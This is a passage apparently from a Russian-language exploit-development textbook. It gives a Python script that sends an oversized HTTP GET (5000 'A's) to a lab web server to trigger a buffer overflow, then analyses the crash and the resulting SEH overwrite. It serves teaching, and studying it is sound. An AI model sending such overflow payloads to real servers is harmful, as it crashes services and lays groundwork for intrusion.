 #!/usr/bin/python3
 import socket
 import sys
 import struct
 import time

 host='10.0.0.6'
 port=80

 try:
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 except:
     print("socket() failed")
     sys.exit(1)

 s.connect((host,port))

 PAYLOAD="A" * 5000

 evil =  "GET " + PAYLOAD + " HTTP/1.1\r\n"
 evil += "Host: 10.0.0.6\r\n"
 evil += "User-Agent: Mozilla/5.0\r\n"
 evil += "Connection: keep-alive\r\n"
 evil += "Accept: text/html,application/xhtml+xml,application/
 xml;q=0.9,*/*;q=0.8\r\n"
 evil += "Accept-Language: en-us,en;q=0.5\r\n"

 s.send(evil.encode())

 s.close()

                      Рис. 15.17. Повторение ошибки

Рассмотрим эту ошибку детальнее:
zz EIP не переписан (не AAAA или 41414141);
zz на часть буфера указывают регистры EDX и EDI (но не на начало);
zz EAX указывает на переписанный адрес (41414141);
zz SEH (рис. 15.18 и 15.19) переписан, что и вызвало ошибку. Больше инфор
  мации о SEH можно найти здесь: https://www. corelan. be/index. php/2009/07/25/
    writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/).
